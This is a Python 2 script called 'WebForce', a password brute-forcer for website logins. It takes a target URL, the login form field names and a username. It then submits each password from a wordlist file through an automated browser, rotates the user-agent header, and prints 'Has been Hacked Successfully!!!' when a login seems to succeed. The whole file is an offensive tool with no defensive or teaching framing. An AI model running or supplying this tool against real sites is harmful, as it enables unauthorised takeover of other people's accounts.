import sys,time,os
import mechanize
import cookielib
import random
def prRed(skk): print("\033[91m {}\033[00m" .format(skk)) 
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk)) 
def prYellow(skk): print("\033[93m {}\033[00m" .format(skk)) 
def prLightPurple(skk): print("\033[94m {}\033[00m" .format(skk)) 
def prPurple(skk): print("\033[95m {}\033[00m" .format(skk)) 
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk)) 
def prLightGray(skk): print("\033[97m {}\033[00m" .format(skk)) 
def prBlack(skk): print("\033[98m {}\033[00m" .format(skk)) 

os.system('clc')
banner = """

██╗    ██╗███████╗██████╗ ███████╗ ██████╗ ██████╗  ██████╗███████╗
██║    ██║██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██║ █╗ ██║█████╗  ██████╔╝█████╗  ██║   ██║██████╔╝██║     █████╗  
██║███╗██║██╔══╝  ██╔══██╗██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
╚███╔███╔╝███████╗██████╔╝██║     ╚██████╔╝██║  ██║╚██████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝

                                                                   """
print banner

print("                            Edmark.net ")
print("                          Web Bruteforce")
print("                           Version: V1")
print("                 Created by: Edmark Jay Sumampen")
print


#Target Website
login = raw_input("Enter URL: ")

#userpassform
u = raw_input("User Form: ")
p = raw_input("Password Form: ")

#email
email = str(raw_input("\n\nUsername: "))
wp = 'wordlist.txt'
#wordlist
passwordlist = str(raw_input("Press Enter to Start")) + wp



#useragents
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordlist")
	exit()
	



def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form[u] = email
	br.form[p] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n[+] Username: " + email + " Password: {}".format(password))
			print("[+] " + email + " Has been Hacked Successfully!!!") 
			m = raw_input('\n\n\n Do You want to exit? [Y/n]: ')
			if m == 'y':
				exit()
			elif m == 'n': 
				os.system("web.py")
				


def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)


#welcome 
def welcome():
	total = open(passwordlist,"r")
	total = total.readlines()
	print
	print (" [*] Account to crack : {}".format(email))
	print (' [*] Possible Passwords: ')
	print (" [*] Cracking, please wait ...\n\n")


if __name__ == '__main__':
	main()
